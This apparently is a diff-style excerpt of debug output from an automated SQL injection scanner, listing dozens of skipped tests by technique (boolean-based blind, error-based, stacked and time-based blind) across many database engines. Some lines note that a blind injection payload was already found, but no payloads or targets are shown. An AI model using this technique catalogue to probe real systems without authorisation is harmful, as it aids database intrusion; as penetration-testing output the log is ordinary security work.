+[17:14:46] [DEBUG] skipping test 'Microsoft Access boolean-based blind - Parameter replace (original value)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'PostgreSQL boolean-based blind - ORDER BY clause (original value)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'Oracle boolean-based blind - ORDER BY, GROUP BY clause' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'IBM DB2 boolean-based blind - ORDER BY clause' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'IBM DB2 boolean-based blind - ORDER BY clause (original value)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.0 boolean-based blind - Stacked queries' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'MySQL < 5.0 boolean-based blind - Stacked queries' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Stacked queries' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'Oracle boolean-based blind - Stacked queries' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'Microsoft Access boolean-based blind - Stacked queries' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'SAP MaxDB boolean-based blind - Stacked queries' because the payload for boolean-based blind has already been identified
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.0 (inline) error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'PostgreSQL AND error-based - WHERE or HAVING clause' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'PostgreSQL OR error-based - WHERE or HAVING clause' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONVERT)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONCAT)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (XMLType)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (XMLType)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Firebird AND error-based - WHERE or HAVING clause' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Firebird OR error-based - WHERE or HAVING clause' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MonetDB AND error-based - WHERE or HAVING clause' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MonetDB OR error-based - WHERE or HAVING clause' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Vertica AND error-based - WHERE or HAVING clause' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Vertica OR error-based - WHERE or HAVING clause' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'IBM DB2 AND error-based - WHERE or HAVING clause' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'IBM DB2 OR error-based - WHERE or HAVING clause' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'ClickHouse AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'ClickHouse OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.5 error-based - Parameter replace (EXP)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'PostgreSQL error-based - Parameter replace' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Parameter replace' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Parameter replace (integer column)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Oracle error-based - Parameter replace' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Firebird error-based - Parameter replace' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'IBM DB2 error-based - Parameter replace' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'PostgreSQL error-based - ORDER BY, GROUP BY clause' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - ORDER BY clause' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Oracle error-based - ORDER BY, GROUP BY clause' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Firebird error-based - ORDER BY clause' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'IBM DB2 error-based - ORDER BY clause' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Stacking (EXEC)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL inline queries' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'PostgreSQL inline queries' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Microsoft SQL Server/Sybase inline queries' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Oracle inline queries' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Firebird inline queries' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'ClickHouse inline queries' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries (comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries (query SLEEP)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL < 5.0.12 stacked queries (BENCHMARK)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'PostgreSQL > 8.1 stacked queries (comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'PostgreSQL > 8.1 stacked queries' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'PostgreSQL stacked queries (heavy query - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'PostgreSQL stacked queries (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'PostgreSQL < 8.2 stacked queries (Glibc - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'PostgreSQL < 8.2 stacked queries (Glibc)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (DECLARE - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (DECLARE)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Oracle stacked queries (heavy query - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Oracle stacked queries (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Oracle stacked queries (DBMS_LOCK.SLEEP - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Oracle stacked queries (DBMS_LOCK.SLEEP)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Oracle stacked queries (USER_LOCK.SLEEP - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Oracle stacked queries (USER_LOCK.SLEEP)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'IBM DB2 stacked queries (heavy query - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'IBM DB2 stacked queries (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Firebird stacked queries (heavy query - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Firebird stacked queries (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'SAP MaxDB stacked queries (heavy query - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'SAP MaxDB stacked queries (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'HSQLDB >= 1.7.2 stacked queries (heavy query - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'HSQLDB >= 1.7.2 stacked queries (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'HSQLDB >= 2.0 stacked queries (heavy query - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'HSQLDB >= 2.0 stacked queries (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (SLEEP)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (SLEEP)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL > 5.0.12 AND time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL > 5.0.12 OR time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind (comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL AND time-based blind (ELT)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL OR time-based blind (ELT)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL AND time-based blind (ELT - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL OR time-based blind (ELT - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'PostgreSQL > 8.1 AND time-based blind' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'PostgreSQL > 8.1 OR time-based blind' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'PostgreSQL > 8.1 AND time-based blind (comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'PostgreSQL > 8.1 OR time-based blind (comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'PostgreSQL AND time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'PostgreSQL OR time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'PostgreSQL AND time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'PostgreSQL OR time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind (IF)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind (IF - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Oracle AND time-based blind' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Oracle OR time-based blind' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Oracle AND time-based blind (comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Oracle OR time-based blind (comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Oracle AND time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Oracle OR time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Oracle AND time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Oracle OR time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'IBM DB2 AND time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'IBM DB2 OR time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'IBM DB2 AND time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'IBM DB2 OR time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Firebird >= 2.0 AND time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Firebird >= 2.0 OR time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Firebird >= 2.0 AND time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Firebird >= 2.0 OR time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'SAP MaxDB AND time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'SAP MaxDB OR time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'SAP MaxDB AND time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'SAP MaxDB OR time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'HSQLDB >= 1.7.2 AND time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'HSQLDB >= 1.7.2 OR time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'HSQLDB >= 1.7.2 AND time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'HSQLDB >= 1.7.2 OR time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'HSQLDB > 2.0 AND time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'HSQLDB > 2.0 OR time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'HSQLDB > 2.0 AND time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'HSQLDB > 2.0 OR time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Informix AND time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Informix OR time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Informix AND time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Informix OR time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'ClickHouse AND time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'ClickHouse OR time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.0.12 time-based blind - Parameter replace' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL < 5.0.12 time-based blind - Parameter replace (BENCHMARK)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL > 5.0.12 time-based blind - Parameter replace (heavy query - comment)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL time-based blind - Parameter replace (bool)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL time-based blind - Parameter replace (ELT)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'MySQL time-based blind - Parameter replace (MAKE_SET)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'PostgreSQL > 8.1 time-based blind - Parameter replace' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'PostgreSQL time-based blind - Parameter replace (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind - Parameter replace (heavy queries)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (DBMS_LOCK.SLEEP)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (DBMS_PIPE.RECEIVE_MESSAGE)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (heavy queries)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'Firebird time-based blind - Parameter replace (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'SAP MaxDB time-based blind - Parameter replace (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'IBM DB2 time-based blind - Parameter replace (heavy query)' because its declared DBMS is different than provided
+[17:14:46] [DEBUG] skipping test 'HSQLDB >= 1.7.2 time-based blind - Parameter replace (heavy query)' because its declared DBMS is different than provided
